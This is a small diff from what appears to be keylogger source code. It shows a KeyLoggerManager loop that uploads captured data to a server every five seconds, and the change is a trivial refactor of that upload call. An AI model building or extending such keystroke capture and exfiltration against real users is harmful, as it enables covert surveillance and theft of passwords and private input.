@@ -68,7 +68,8 @@ class KeyLoggerManager:
         while self.__instance.action:
             if self.__instance._KeyloggerService__data:
                 print('server write')
-                writer.write_to_server(self.__instance.data)
+                data = self.__instance.data
+                writer.write_to_server(data)
             time.sleep(5)
         writer.write_to_server(self.__instance.data)
 
